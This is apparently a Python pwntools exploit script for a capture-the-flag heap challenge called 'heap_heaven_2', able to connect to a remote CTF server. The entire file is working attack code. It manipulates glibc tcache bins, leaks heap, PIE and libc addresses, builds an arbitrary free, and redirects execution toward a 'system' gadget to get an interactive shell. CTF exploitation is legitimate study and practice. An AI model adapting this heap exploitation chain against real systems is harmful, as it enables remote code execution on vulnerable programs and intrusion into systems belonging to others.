#!/usr/bin/python
from pwn import *
import sys

"""
This exploit is for the server!
"""

HOST = "arcade.fluxfingers.net"
PORT = 1809

def write(off, s):
	r.sendline("1")
	r.sendline(str(len(s)))
	r.sendline(str(off))
	r.send(s)
	return

def free(off):
	r.sendline("3")
	r.sendline(str(off))
	return

def leak(off):
	r.sendline("4")
	r.sendlineafter("leak?\n", str(off))
	return r.recvline().rstrip()

def exploit(r):

	# fill up tcache
	for i in xrange(7+2):
		write(0+i*0x100, p64(0)+p64(0x111))
	for i in xrange(7):
		free(0x10+i*0x100)

	# leak top chunk
	write(0, p64(0)+p64(0x111))
	write(0x110, p64(0x0)+p64(0x111))
	write(0x220, p64(0x0)+p64(0x111))
	free(16)

	heap_leak = u64(leak(16).ljust(8, "\x00"))
	log.info("heap_leak : 0x{:x}".format(heap_leak))

	# leak some functions (leak PIE)
	write(0x1000, p64(heap_leak-16))
	bye = u64(leak(0x1000).ljust(8, "\x00"))
	write(0x1000, p64(heap_leak-8))
	menu = u64(leak(0x1000).ljust(8, "\x00"))
	pie_base = bye - 0x1670
	log.info("pie_base : 0x{:x}".format(pie_base))
	log.info("bye : 0x{:x}".format(bye))
	log.info("menu : 0x{:x}".format(menu))
	

	# leak mmaped_region
	write(0x1000, p64(pie_base+0x4048+1))
	mmapped = u64("\x00"+leak(0x1000).ljust(7, "\x00"))
	log.info("mmapped : 0x{:x}".format(mmapped))

	# arbitrary free
	arb_free = lambda x : free(x-mmapped)
	
	# leak libc_base
	write(0x1000, p64(pie_base+0x3f78))
	libc_base = u64(leak(0x1000).ljust(8, "\x00"))-0x85f20#0x844f0 #free
	log.info("libc_base : 0x{:x}".format(libc_base))

	# fill up tcache fastbins
	for i in xrange(7+1):
		write(0+i*0x20, p64(0)+p64(0x21))
	for i in xrange(7):
		free(0x10+i*0x20)

	# create new state
	write(0x1500, p64(0)+p64(0x21))
	write(0x1520, p64(0)+p64(0x21))
	free(0x1500+16)
	write(0x1500, p64(libc_base+0xe75f0)+p64(menu))#pie_base+0x14BD))#menu)) # system
	arb_free(heap_leak-0x30)

	# win
	r.sendline("5")

	r.interactive()
	return

if __name__ == "__main__":
	elf_name = "./heap_heaven_2"
	e = ELF(elf_name)
	
	libc_name = ""#./libc.so.6"
	#libc = ELF(libc_name)

	if sys.argv[-1] == "remote":
		r = remote(HOST, PORT)
		exploit(r)
	else:
		if libc_name != "":
			r = process(elf_name, env={"LD_PRELOAD" : libc_name})
		else:
			r = process(elf_name)
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
